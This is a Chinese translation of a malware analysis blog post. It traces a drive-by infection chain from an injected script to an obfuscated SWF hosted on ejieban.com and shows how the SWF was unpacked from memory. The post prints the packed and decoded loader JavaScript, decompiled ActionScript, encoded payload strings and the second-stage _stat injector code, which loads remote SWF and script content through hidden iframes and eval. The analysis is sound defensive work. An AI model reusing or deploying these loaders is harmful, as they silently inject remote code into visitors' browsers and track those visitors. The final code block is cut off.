> 原文链接: https://www.anquanke.com//post/id/85098 


# 【技术分享】如何分析经过混淆的SWF


                                阅读量   
                                **193552**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：bittherapy.net
                                <br>原文地址：[https://bittherapy.net/analyzing-obfuscated-swfs/](https://bittherapy.net/analyzing-obfuscated-swfs/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01f16ab68cc609bcb0.jpg)](https://p3.ssl.qhimg.com/t01f16ab68cc609bcb0.jpg)

翻译：[](http://bobao.360.cn/member/contribute?uid=2606886003)[](http://bobao.360.cn/member/contribute?uid=1427345510)[m6aa8k](http://bobao.360.cn/member/contribute?uid=2799685960)[](http://bobao.360.cn/member/contribute?uid=2606886003)

预估稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿 

<br style="text-align: left">

**前言**



几天前，我突然收到一个警报，说电脑正在与（不良）域通信并下载SWF文件。我有一些担心，所以，我决定彻底调查一下，看看是否真的感染了恶意软件。

当时，电脑正与NovaSyncs.com进行通信，而后者则通过mine.js发送恶意JS：



```
document.write(unescape("%3Cscript src='http://i.ejieban.com/clouder.js' defer='defer' type='text/javascript'%3E%3C/script%3E"));
```

我进一步深入挖掘： 



```
eval(function(p,a,c,k,e,r)`{`e=function(c)`{`return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))`}`;if(!''.replace(/^/,String))`{`while(c--)r[e(c)]=k[c]||e(c);k=[function(e)`{`return r[e]`}`];e=function()`{`return'\w+'`}`;c=1`}`;while(c--)if(k[c])p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c]);return p`}`('a("V"==1B(3))`{`3=[];3.g=[];3.K=9(h)`{`4 6=5.16("1u");6.w.o="0";6.w.j="0";6.w.1G="1M";6.w.29="-2d";6.1p=h;1j 6`}`;3.C=9(v,8)`{`4 6=3.K(v);5.b.C(6,5.b.Z[0]);3.g[8]=6`}`;3.y=9(v,8)`{`4 6=3.K(v);5.b.y(6);3.g[8]=6`}`;3.1e=9(1f,8)`{`4 f='&lt;1w'+'J 1E'+'c="'+1f+'" 1K'+'1L="1" 1R'+'1U="1"/&gt;';3.y(f,8)`}`;3.27=9(11)`{`4 14=5.1n('1o')[0];4 n=5.16('1q');14.y(n).F=11`}`;3.1s=9(8)`{`H`{`a(3.g[8])`{`5.b.1v(3.g[8]);3.g[8]=V`}``}`I(e)`{``}``}`;3.X=9(8,r)`{`4 l="D"+"p://1N"+"1O.c"+"1Q.c"+"E/1T"+"t.23"+"m?8=";l+=8+"&amp;r="+25(r)+"&amp;G=";4 f=k;4 G=f.u.2e||f.u.2f;l+=G.2g()+"&amp;2h"+"J=2j&amp;2v"+"2w=0&amp;2x"+"J=0&amp;2y"+"2I"+"d=";l+=z.1m(T*z.U())+"-2M"+"1t-";4 W=f.A.o&amp;&amp;f.A.j?f.A.o+"x"+f.A.j:"1x";l+="&amp;1y"+"1z="+W+"&amp;1A=0&amp;s"+"1C=&amp;t=&amp;1D="+z.1m(T*z.U());1j l`}`;3.L=9()`{`a(5&amp;&amp;5.b&amp;&amp;5.b.Z)`{`4 1F=k.u.10;4 1H=k.1I.1J;4 M="D"+"p://i.12"+"13"+"N.c"+"E/s"+"1P.s"+"15?d=19.s"+"15";4 O="s=1S";4 P='&lt;17 1V="1W:1X-1Y-1Z-20-21" 22="18://24.1a.1b/26/1c/28/1d/2a.2b#2c=7,0,0,0" o="0" j="0"&gt;&lt;Q R="1g" S="1h"/&gt;&lt;Q R="2i" S="'+M+'"/&gt;&lt;Q R="1i" S="'+O+'"/&gt;&lt;2k F="'+M+'" 1i="'+O+'" o="0" j="0" 1g="1h" 2l="2m/x-1c-1d" 2n="18://2o.1a.1b/2p/2q" /&gt;&lt;/17&gt;';P+='&lt;2r F="'+3.X("2s"+"2",5.2t)+'" o="0" j="0"/&gt;';3.C(P,"2u")`}`B`{`1k(3.L,1l)`}``}`;3.L();3.q=9()`{`a(5&amp;&amp;5.b)`{`H`{`a(/\2z\2A\2B/i.2C(k.u.10))`{`4 l="D"+"p://i.12"+"13"+"N.c"+"E/s"+"2D.h"+"2E#s/N";3.1e(l,"2F")`}``}`I(e)`{``}``}`B`{`1k(3.q,1l)`}``}`;H`{`a("2G"==5.2H)`{`3.q()`}`B`{`a(5.Y)`{`k.Y("2J",3.q)`}`B`{`k.2K("2L",3.q,1r)`}``}``}`I(e)`{``}``}`',62,173,'|||_c1oud3ro|var|document|node||id|function|if|body|||||nodes|||height|window||||width||oload2||||navigator|html|style||appendChild|Math|screen|else|insertBefore|htt|om|src|lg|try|catch|me|getDivNode|oload|fp|an|pm|str|param|name|value|2147483648|random|undefined|sp|stat|attachEvent|childNodes|userAgent|js|ej|ieb|head|wf|createElement|object|http||macromedia|com|shockwave|flash|appendIframe|url|allowScriptAccess|always|flashVars|return|setTimeout|200|floor|getElementsByTagName|HEAD|innerHTML|SCRIPT|false|removeNode|6171|DIV|removeChild|ifra|0x0|sho|wp|st|typeof|in|rnd|sr|ua|position|ho|location|host|wi|dth|absolute|hz|s11|tat1|nzz|he|de|sta|ight|classid|clsid|d27cdb6e|ae6d|11cf|96b8|444553540000|codebase|ht|fpdownload|encodeURIComponent|pub|appendScript|cabs|left|swflash|cab|version|100px|systemLanguage|language|toLowerCase|nti|movie|none|embed|type|application|pluginspage|www|go|getflashplayer|img|203338|referrer|_cl3r|rep|eatip|rti|cnz|wnd|wo|wd|test|tatn|tml|_9h0n4|complete|readyState|z_ei|onload|addEventListener|load|139592'.split('|'),0,`{``}`))
```

上述代码解码后的内容如下所示，它最后会提供一个可疑的flash对象（stat.swf）：



```
eval(  
    if ("undefined" == typeof(_c1oud3ro)) `{`
        _c1oud3ro = [];
        _c1oud3ro.nodes = [];
        _c1oud3ro.getDivNode = function(h) `{`
            var node = document.createElement("DIV");
            node.style.width = "0";
            node.style.height = "0";
            node.style.position = "absolute";
            node.style.left = "-100px";
            node.innerHTML = h;
            return node
        `}`;
        _c1oud3ro.insertBefore = function(html, id) `{`
            var node = _c1oud3ro.getDivNode(html);
            document.body.insertBefore(node, document.body.childNodes[0]);
            _c1oud3ro.nodes[id] = node
        `}`;
        _c1oud3ro.appendChild = function(html, id) `{`
            var node = _c1oud3ro.getDivNode(html);
            document.body.appendChild(node);
            _c1oud3ro.nodes[id] = node
        `}`;
        _c1oud3ro.appendIframe = function(url, id) `{`
            var f = '&lt;ifra' + 'me sr' + 'c="' + url + '" wi' + 'dth="1" he' + 'ight="1"/&gt;';
            _c1oud3ro.appendChild(f, id)
        `}`;
        _c1oud3ro.appendScript = function(js) `{`
            var head = document.getElementsByTagName('HEAD')[0];
            var n = document.createElement('SCRIPT');
            head.appendChild(n).src = js
        `}`;
        _c1oud3ro.removeNode = function(id) `{`
            try `{`
                if (_c1oud3ro.nodes[id]) `{`
                    document.body.removeChild(_c1oud3ro.nodes[id]);
                    _c1oud3ro.nodes[id] = undefined
                `}`
            `}` catch (e) `{``}`
        `}`;
        _c1oud3ro.stat = function(id, r) `{`
            var l = "htt" + "p://hz" + "s11.c" + "nzz.c" + "om/sta" + "t.ht" + "m?id=";
            l += id + "&amp;r=" + encodeURIComponent(r) + "&amp;lg=";
            var f = window;
            var lg = f.navigator.systemLanguage || f.navigator.language;
            l += lg.toLowerCase() + "&amp;nti" + "me=none&amp;rep" + "eatip=0&amp;rti" + "me=0&amp;cnz" + "z_ei" + "d=";
            l += Math.floor(2147483648 * Math.random()) + "-139592" + "6171-";
            var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + "x" + f.screen.height : "0x0";
            l += "&amp;sho" + "wp=" + sp + "&amp;st=0&amp;s" + "in=&amp;t=&amp;rnd=" + Math.floor(2147483648 * Math.random());
            return l
        `}`;
        _c1oud3ro.oload = function() `{`
            if (document &amp;&amp; document.body &amp;&amp; document.body.childNodes) `{`
                var ua = window.navigator.userAgent;
                var ho = window.location.host;
                var fp = "htt" + "p://i.ej" + "ieb" + "an.c" + "om/s" + "tat1.s" + "wf?d=19.s" + "wf";
                var pm = "s=de";
                var str = '&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="0" height="0"&gt;&lt;param name="allowScriptAccess" value="always"/&gt;&lt;param name="movie" value="' + fp + '"/&gt;&lt;param name="flashVars" value="' + pm + '"/&gt;&lt;embed src="' + fp + '" flashVars="' + pm + '" width="0" height="0" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;&lt;/object&gt;';
                str += '&lt;img src="' + _c1oud3ro.stat("203338" + "2", document.referrer) + '" width="0" height="0"/&gt;';
                _c1oud3ro.insertBefore(str, "_cl3r")
            `}` else `{`
                setTimeout(_c1oud3ro.oload, 200)
            `}`
        `}`;
        _c1oud3ro.oload();
        _c1oud3ro.oload2 = function() `{`
            if (document &amp;&amp; document.body) `{`
                try `{`
                    if (/wndwowd/i.test(window.navigator.userAgent)) `{`
                        var l = "htt" + "p://i.ej" + "ieb" + "an.c" + "om/s" + "tatn.h" + "tml#s/an";
                        _c1oud3ro.appendIframe(l, "_9h0n4")
                    `}`
                `}` catch (e) `{``}`
            `}` else `{`
                setTimeout(_c1oud3ro.oload2, 200)
            `}`
        `}`;
        try `{`
            if ("complete" == document.readyState) `{`
                _c1oud3ro.oload2()
            `}` else `{`
                if (document.attachEvent) `{`
                    window.attachEvent("onload", _c1oud3ro.oload2)
                `}` else `{`
                    window.addEventListener("load", _c1oud3ro.oload2, false)
                `}`
            `}`
        `}` catch (e) `{``}`
    `}`)
```



**<br>**

**揭开这个SWF的面纱**



ejieban.com的stat.swf文件好像是由DComSoft的SWF Protector进行编码处理的。SWF Protector实际上就是一种编码器，用于防止flash字节码被人分析之用。

幸运的是，它很容易被逆向。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01607fc285adfde40a.png)

由于SWF Protector与其他编码器的原理都是一样的，所以可以插入一个存根，将原始资源加载到内存中并对其进行解码。很明显，这要借助于this.loader对象，并且最终要调用this.loader.loadBytes（）： 

[![](https://p3.ssl.qhimg.com/t01bcd5140f47c972ce.png)](https://p3.ssl.qhimg.com/t01bcd5140f47c972ce.png)

在使用FFDec对其进行调试时候会遇到一些麻烦，因为flash调试器会崩溃，所以无法击中断点。

由于SWF Protector最终会把解码的SWF载入内存，因此不妨在Firefox中执行stat.swf，然后在plugin-container.exe的内存空间中搜索SWF对象。

使用Flash 23执行这个SWF的时候，会触发一个沙盒安全异常，该异常与ExternalInterface.call（）有关。ExternalInterface是一个允许Flash对象在浏览器上执行代码的API： 

[![](https://p4.ssl.qhimg.com/t017f55533581d47fc7.png)](https://p4.ssl.qhimg.com/t017f55533581d47fc7.png)

当Firefox中的Adobe Flash插件等待处理这个异常的时候，我可以通过FFDec的Tools &gt; Search SWFs in memory选项，来查找并转储这个解码后的Flash对象： 

[![](https://p5.ssl.qhimg.com/t01a823f8281c76fdd7.png)](https://p5.ssl.qhimg.com/t01a823f8281c76fdd7.png)

我要找的是plugin-container.exe，由Firefox生成的一个处理插件的单独进程： 

[![](https://p4.ssl.qhimg.com/t01afff6ced820370c5.png)](https://p4.ssl.qhimg.com/t01afff6ced820370c5.png)

实际上，在内存中有多个SWF对象；而我感兴趣的，是大小比经过编码的原始SWF（13kb）略小的那一个。通过鼓捣SWF Protector，我发现它对SWF进行混淆处理的时候，压缩率不是很大，因为最终添加到混淆后的对象中的stub代码，大小只有几KB的而已。

在87 *地址范围内大小为11kb的对象，应该就是我寻找的目标。

我发现，是对SSetter类的引用导致Firefox抛出了前面提到的那个异常；所以，它肯定就是解码后的那个SWF。对于这个对象，我们可以把它保存到磁盘，以进行进一步的分析。

<br style="text-align: left">

**对解除混淆后的代码进行分析**

这个解码后的SWF使用了一个BaseCoder类，它貌似是一个带有自定义字符表的base64编码/解码程序： 



```
package disp  
`{`
   import flash.utils.ByteArray;
 
   public class BaseCoder
   `{`
      private static var base64Table:Array = ["L","V","4","F","k","1","d","E","T","7","_","N","Y","5","t","S","o","2","m","s","H","U","w","P","R","i","u","b","j","Z","3","y","I","z","g","h","X","^","G","e","D","p","0","9","r","l","K","O","8","B","W","6","n","q","Q","v","a","c","f","A","C","J","x","M","~"];
 
      private static var decode64Table:Array = null;
      ...
```

在SSetter类的顶部，有一个硬编码的字符串ss非常显眼。：

```
private var ss:String = "iizPzbG4cZhw^ZOdzb8gkNrdBR9WHNrd^jAgqiGscZhw^ZOdzbhgl_WP2iqPajDGBRz6jSeWHtDG1jWdUj7QobDeJRzWX_pmI_DWqRh6k7pwYSqh5Snq^jKGciGWJjlGzozQ5jOXHiDdrRWWXtfmcRnW5bnq^jKGIi6WX5pglypsIizgj7KWUj8G1bhdIiOmCPrg2HWvcuew^_AmzZpQHbDdnRlW7_bPzihmn_JUluhqBPCPzihml_9slSGUcZhw^ZOdzb^gl_WP2iqPajIGlj^^qPZPHtJQUiKe2RpvabDQl_WP2iqPajeGBPv1Z_JWYtJQnYAPzZpQHbDdnRlW^_Gwl_bdnRpqqj8F7N^eBjzdHRDQUbvG7T^1UianIje4BPg1l7^WY_pdZ_jWTPedZNe4X7rWluhqXPAmUjnG7ZKPVTJEj_D4I5p4D3KvqYb6rPqsoTJdrR6sTNJhTTAgcYqWLSAscYcWoSDs^YAgcYqWLSAsz5XgTwcWnTG^27bGXTghcPcml_XPTwcWnTK^I3Wmq_JPYtK6aYJGI5W4r_QPY_KFnYJhXY6gHNJenYAEaYBWnYnFT_rFBb5W8NrkBZ8gr_QP2_bdnYG^27bGnYK^RRGmriW1cPzmTwcWnTG^27bGnYK^rRgU7tZmJwZQl_1PR3D6RjG4TTzgLSpP13e68_e1riW1cPzmTwcWqTb^qbjql78Wq_BP23bQnYK^rRgU7tZmJwZQn_rkBsQ4q_JPz2^Wl_JPcYcWT_pF1yAPaYWWTSAscYqWr_AWI56gHNxekYpHcYcWT_pFktIvIonm^_A4aYBWIYW4CNrdBsYmRNrE^jJ47NWFq_JPYtK6nwgho_DFBiv4YNpdU3Anz5hgqTjs7Pj4TPp4R3D6aRBWzbjmTPK4BjjqlTjgTPW4BZj^XTxgkNpsH3I6qRhhHtI6qojh7Pj4TPA4L5WmBSjU^TjhTPA4V5amYSKwnYDw8Pg1BTjUXTAgz5agnSBgl_gPYSKwRYDwBYa4l_4sYSKwRYDwr3B4l_JsHtI6qmjF87B6LiamBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg11TFFBSjU1T7h1t_h1NNs1Nts1NHs1NRs8Pg17TlFBSjU1TXhCtOgkYKeawBmCtWmC3BmC5BgCjBWC5BmaZB4YZBmn3vhLNrF8Y848Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPx4aSIkquj6TPB4BYjqVTogBSjUkTWh8Pg1aNC6Vs9gBSjU1T2h8Pg1LTJ18Pg1jP94lRjgB7jqCTxgaSIkquj6TPB4BYjUVTogBSjU8Te^T_9nZPj4TPO48SBhLUaWBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg1YTJ18Pg1jP94lRjgB7jqLTBgqYjs7Pj4l74W8_eq8Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPI4YYJs8Pg17YjsTPI4XYJU8Pg1jYOhn3B4n5BgB5jULTWgqtjFTPB4DiOFTNc6XNK^XYOsrYOGBYjGTPI4aNC61N^68Se^otKQcUU4o_KdzUjg17h6jPp4a_BmqbT61yAPaiW4z2jg1786jPp4VwZ6HND^ciw48_e11YjPX7pWYNJ^lRjWc7eWZPJ4qyEPH_pdq3JvT_AmcYPWoSDsBYDgr_qPaTJdciw48_e15YjwX7AWcbdgDNJGLTghatKQc2pgTS8mlTKhRNKXRYJP1TvhlTKhRNKXIYJPnTBgT3AmrYgqTH9mnYJ^lbKh1NOhISAwciH4HND^^bJgYtK6nsn6T_rFoYpsH3I6qmjF87B68oe^8_eqLmaW7Sjmr7WW8_eqVT9g7Sjmr7WW8_eqLTBg82e18_eqnRg6jP94oY9sjPg41T1FjP94jPB4n2ghTYImZYjHl7jW17T6TSBmCTxgjPA4cYPWT_rF^mJ4YtK6nmnhT_rFjYpsU3AnL5BmqtXF7wZ6DNKeBYCH2ybdnYK^a3BgriB6ItB4^5JWz2^Wl_JPry6s1N5hoSDsBYggjNrd^ZA4I5BgqSnsr_6PCNDX8YggCYfHLYgUl_Vso_DFr_6PDNDX8Y6gDN9^zTzgVNf4VNj4T79WrRggjPp4Tt9W^iJW1NzFq_BPY3K6IsWWTNB4aHBgYHgWT_pQRtD6RiGWZPj4k7JW^iVWo_DFr_6PDNDXBYegn_rPkYpwnyAPaYBWnRnhT_pFo3KQaUB4IU6m7w2WrTWgXPAmrYgqTH9mnYJ^iYJUYtK6nwnFI_rF^jAgV5rmTSBmTw9gLTfeCNWWTY94TTBhYNgGT_WWcYhgrTggYYOhoYgh7_nWTNqhrTggCbasTSAmrbJ4rtg4T7JerTWgz5Wgr_gmX7JXrTqhRTJdr3qhXTJkaiBgauW4BRCPaiBgauW4lRrhq_767NhhX_94RTWgTi94rTJXHYGGRYgGT_WWni8677DhrTggnm8677phrTggDYgG7_XWTSAmrbJ4a2B4IuBmpukg1N9hX_p4T_lWCYgGT_WWnjg4HtI68YJwciFgDNGGR7KGcopWRSKQco0W7_aWlTGgYNKXDugsYYge8t9QTSGmoYgeT_WWnZgs1_r6T_GWaYJwiY64rTggjYJeo7Je77ahTS9ma2B4IuBmpukg1N9hX_p4HtI6qHjhB7m6YTJ18Te^8_9QjPg4DTJdLTghXTJdLTghcNj6r7W6V3mgry6s1NKhoSDs^bA4L5am7SRmrTDgkYIXTYDXX_KmYYDXr_qsITJdcYRW8_e12YjXB7rWByzE7N1hr_6sjND^BtD4l_Vso_DFl_1PY3K6TYDw^tJ4z2^Wl_JP8yBm^jJgXyDmr_esRNWFkNQF85egByGEBiyE2jzvBZGEcZhw^ZOdBbQe7RCPiuCw^yXd5yyE2jzvBZXE5bqQUbKwBZGEBjCEByCE5uCezy^dZuDwBZvE2unwBuKEqR^wByCEiyKdBy^E5b^EByCEZynEBRCvByGEcuCw^ZKQJivd5y^E2Zp1UbOw2ZCPqjCd5jWQUiKwqyzkzZCd7ZcE5ynEB3^w5yzd5ZDd5ynEBjreBizvpj6dqy^d5yKE5yOEBb8E7RzPBbzPijXdiyzEUb^E2ypdBZpeZbCw7jhv7yOd^iCEVR8PciXwzopQ2bCd7R^v2R^PB2^wUbKwBZzE2jpdBZfeB3le5RWwqb^Q^izd5y6EZynEiyrd5RDP1UWGBjzvZbzE53CPBRrwZbsv7Rpv2jVE5R^Q5jCv7ZrPiyrd5RDP5yDE5b9Q1ZQQBinP23CE1RrQUbQdBRCwJRlQky8FVYCFqjCG^2wkzyndVZCE7b0Q5inw5yqE5RneBj^e1ZrGcyzd^ZeG2ROPBjGeJbOd8jWeoYvsI56Fo5ah7yzE2bOGBb6PBjpE2b^GJ3Gk5ynE^yKdUbWG2m51BsTE12kH5yF1^HoX8UBEL58s5yzd5RCeZjGv1b6dBuhE7RCwJj6d2upPcbCQ7R6wBbqQUZCdUbGd8ZBEVY8FB3QE7i6PJuKwjy8F^yGd1jCGBRzQ5jpvBi6EBjveBuXPzZCdUuCdZuDwBZhE5bpEBiXEZYhhTiQdBizPiiXsUyad5isw7Rpv2jCEVRCP1YhsBizeJRqGBZgE1bKdBulvibpvBi6P1ZndzyndBbCwitgsBtWEqiOwUZFG^urdBiKEBZrwUyldURXGoynFH5qFHYn6LY8FBYnEV3^PzyndBZDEB36e1YCspbfeJyld5ynEBRDPBZ^E5bOGUiUd^HFXqb8Qcb^Q2bCeVR8P^bhd2RpPcbCQBjqd^iKQVjzvUiCQZZvv5ycE2j^vBbzHZbqGZR^wByzdZbqGZR^w2yOEJsvd7iFP5R^PcyndBuKPcb^Q7y^EBj^E2RpPBjWE^ZCdcRfQpyyE^iCwJiCQUinQBizGzj8Q1bcd7iCPJRXQ7izwUjCQUird^RCPYYcsX5WsRyBF15C6ViXeZbKvJbzd8iqEVYCFIY8E5yDEBbvvBjvEBipeBbWe2bCGUjgE7y^EUZWEBbKeZiCP12ndBieP2iHPqu^wkyvFY5QFVYCFUjGG7iWP7iCPUinQB2^wUbKw5Z4E23zUciznHbew5N8e^bndZ_C4X7rWBYA4Xypm";
```

 fetchit（）函数会调用i.ejieban.com/stat.do?p=xxx，返回由这个自定义的base64编码的数据组成的数组（用分号分隔）。 

调用路径：





```
fetchit()-&gt;  
  fetchcallback()-&gt;
    preappend()-&gt;
      decodeArray()-&gt;
        (BaseCoder).decode([data_from_stat_do])
```



```
private function fetchit() : void
      `{`
         var _loc1_:String = this.host + "stat2.do?p=" + this.ipStr;
         var _loc2_:URLLoader = new URLLoader();
         _loc2_.dataFormat = URLLoaderDataFormat.TEXT;
         _loc2_.addEventListener(SecurityErrorEvent.SECURITY_ERROR,securityErrorHandler);
         _loc2_.addEventListener(IOErrorEvent.IO_ERROR,ioErrorHandler);
         _loc2_.addEventListener(Event.COMPLETE,this.fetchcallback);
         _loc2_.load(new URLRequest(_loc1_));
      `}`
 
      private function fetchcallback(param1:Event) : void
      `{`
         ...
            this.preappend();
         ...
      `}`
      private function preappend() : void
      `{`
         ...
            this.decodeArray(_loc1_.data.oarr);
         ...
      `}`
      private function decodeArray(param1:String) : void
      `{`
         var _loc5_:String = null;
         var _loc6_:Array = null;
         var _loc2_:BaseCoder = new BaseCoder();
         var _loc3_:String = _loc2_.decode(param1);
         ...
      `}`
 
/* stat.do?p=xyz returns:
 
IYnsjNqhTNBha5a4M5^^FgG0Mg^Ap_j~  
1uOdIYAWz_nwLZfEJN6W5N6ecbB4qu6dcihWnbOQ5jrvLN86jY6hH58wk5chHR8wIiKFZjGvr_pFUjnQr_pFr_pF5byeVRpPzNzGab6WL5KhcRyQ^b6P2u^Pr_pFCN6WcY^m^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFUbrerbDFXtDWajrQXZDgrHph1uOdYYDv^tDW2Z8ECtOgcj6W8jKQzjpwjbKwJRlQ5N6vCb84TYvFUY^6RYBF1t^woYad5NveIiAg5_^PIZA4I_Amc_6w1P8QcuDmCRKwRY865NKGqPcQ^jnQIiAmC_OmkYK6pipw7izwcbhgnbOQBROQ2Z^wcj0gIjAWc_qw8bAdr_pF5_KERNpET_A1i_lwYjDF^tDW2Z8ECtOgLRKhpipw7izwcbhgnbOQqi8Gr_pF7ZpvHZDd^t6W8bDQ^t6W1blGIiAmz_nwLZfEJNgWcY^4^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFT_A1^_Gwciewr_pF2unEDjOFXN6v^NGGciewquew5NOGJb^mjiaFC58WktWsiNrQ5RDPJoOQ^u^Q5NveIiAg^_GwciewB2zGzjFQJb9QUuswoiDP^tvWjZKviu^wjbKGJRlQr_pF^ZXwr_pF2unEDjOFXNBQUN0GUugwaRKwJRlQ5NrQUbXvTiKPYuDeXtDWUbvG2TzkHZpdZN^G2Zp1HbDwl_jmJ7jqr7DWkYnho5a6RYn6pt542RDP7Nze2bOGIbpmLypF2NOe2HWvcuewY_QFl_5m2RDP7NOecZXw1_1Fp5542RDP7Nze2bOGIbpmz_mm^taWI36Pr_pF2unEDjOFYNWv1NDequew5NOGJb6m1ZndYuOwLYWFY5q6LiQs^YzsViXsct64RZDQ^t6WoiDPXtDW^tyWzPqQouDw^tDW2Z8ECtOgkYK6pipw7izwcbhgnbOQBROQ2Z^wIjKeYuDe^tQWTRIPRPJvJNyqUupEniDFawAqDPpml_CFX7O4cu^mU3hd2_OdURlvcinw5NOGlbpQXiAmRPMvUihd2b^Q7U7UJolQJjKdcinwJ_Q11wZ6p_js87eqItAWz_6mBbQg_o~~  
*/
```

下一步是通过自定义的base64解码程序处理此数据，但是利用FFDec调试解码后的SWF仍然是一件非常棘手的事情。对于独立的Flash调试器来说，没有ExternalInterface API可资使用。但是，这个SWF的代码会特意检查ExternalInterface，如果不存在则退出。有两种方法可以解决这个问题。

**第一个方法：**

修改SWF字节码，清除针对ExternalInterface进行检查的代码，这样就可以通过FFDec调试器来处理解码程序了，

[![](https://p4.ssl.qhimg.com/t0129d1fca885e1d196.png)](https://p4.ssl.qhimg.com/t0129d1fca885e1d196.png)

 虽然这样能够绕过检查，但在我的系统上好像无法正常监视变量。我试过Flash 23和Flash 18调试器，都无法看到内存中的变量的内容。

**第二个方法： **

1. 在FlashDevelop中创建一个新的ActionScript项目

2. 将BaseCoder.as添加到项目中

3. 使用要解码的base64数据填充Main类（变量：ss，from_stat_do_1，from_stat_do_2）

4. 在Firefox中编译和执行SWF

5. 检查控制台日志中解码后的数据

[![](https://p2.ssl.qhimg.com/t01000e5ea3c83fe11e.png)](https://p2.ssl.qhimg.com/t01000e5ea3c83fe11e.png)

在base64解码数据中涉及了更多的JavaScript和SWF文件：

[![](https://p3.ssl.qhimg.com/t01d2d47dad5b57865b.png)](https://p3.ssl.qhimg.com/t01d2d47dad5b57865b.png)

这个JavaScript代码非常简单，好像提供一个允许恶意软件注入更多的SWF、JavaScript和IMG标签的_stat对象：



```
(function() `{`
    window._stat = [];
    var d = document;
    _stat.fd = "";
    _stat.wtc = 0;
    _stat.fin = function(fd) `{`
        _stat.wtc = 0;
        if (d["s_stat"] &amp;&amp; d["s_stat"].fin) `{`
            d["s_stat"].fin(fd)
        `}`
    `}`;
    _stat.delay = function(fd) `{`
        if (_stat.fd == fd) _stat.wtc = 0
    `}`;
    _stat.wt = function(fd, fn, sol, sn, v, p) `{`
        if (d[fd] &amp;&amp; d[fd].document &amp;&amp; d[fd].document["s_stat"] &amp;&amp; d[fd].document["s_stat"][fn]) `{`
            try `{`
                if (p &amp;&amp; "" != p) `{`
                    eval('d[fd].document["s_stat"][fn]' + p)
                `}` else `{`
                    d[fd].document["s_stat"][fn](sol, sn, v)
                `}`
            `}` catch (e) `{``}`
            _stat.fin(fd)
        `}` else `{`
            _stat.fd = fd;
            _stat.wtc++;
            if (_stat.wtc &gt; 70) _stat.fin(fd);
            else setTimeout(function() `{`
                _stat.wt(fd, fn, sol, sn, v, p)
            `}`, 500)
        `}`
    `}`;
    _stat.ss = "(function(d,w,c)`{`try`{`if(c!="")`{`if(c.indexOf(".s"+"wf")&gt;-1)`{`var fp=c;var pm="";var fd="s_stat";var x=c.indexOf("!");if(x&gt;-1)`{`fp=c.substr(0,x);pm=c.substr(x+1);`}`;var str='&lt;object id="'+fd+'" name="'+fd+'" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="1" height="1"&gt;&lt;param name="allowScriptAccess" value="always"/&gt;&lt;param name="movie" value="'+fp+'"/&gt;&lt;param name="flashVars" value="'+pm+'"/&gt;&lt;embed id="'+fd+'" name="'+fd+'" src="'+fp+'" flashVars="'+pm+'" width="1" height="1" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;&lt;/object&gt;';d.body.appendChild(d.createElement('DIV')).innerHTML=str`}`else`{`d.getElementsByTagName('HEAD')[0].appendChild(d.createElement('SCRIPT')).src=c+'.js'`}``}``}`catch(e)`{``}``}`)";
    _stat.apdiv = function(fd, h) `{`
        var n = d.createElement('DIV');
        n.style.width = "0";
        n.style.height = "0";
        n.style.position = "absolute";
        n.style.left = "-100px";
        _stat["div" + fd] = n;
        n.innerHTML = h;
        d.body.appendChild(n)
    `}`;
    _stat.apfd = function(fd, url) `{`
        var str = '&lt;iframe id="' + fd + '" name="' + fd + '" src="' + url + '" width="1" height="1"/&gt;';
        _stat.apdiv(fd, str)
    `}`;
    _stat.apjs = function(fd, txt) `{`
        try `{`
            var calleval = d[fd].window.execScript || d[fd].window.eval;
            calleval(txt)
        `}` catch (e) `{``}`
    `}`;
    _stat.ap = function(fd, fp, js, t) `{`
        if (1 == t) `{`
            _stat.apfd(fd, "about:blank");
            setTimeout(function() `{`
                _stat.apjs(fd, _stat.ss + "(document, window, '" + fp + "');" + js)
            `}`, 1000)
        `}` else `{`
            _stat.apfd(fd, "stat.html#" + fp);
            if (js &amp;&amp; '' != js) setTimeout(function() `{`
                _stat.apjs(fd, js)
            `}`, 1000)
        `}`
    `}`;
    _stat.rm = function(fd) `{`
        d.body.removeChild(_stat["div" + fd]);
        _stat["div" + fd] = null
    `}`;
    _stat.zz = function(id, r) `{`
        var l = "http://hzs11.cnzz.com/stat.htm?id=";
        l += id + "&amp;r=" + encodeURIComponent(r) + "&amp;lg=";
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + "&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=";
        l += Math.floor(2147483648 * Math.random()) + "-1395926171-";
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + "x" + f.screen.height : "0x0";
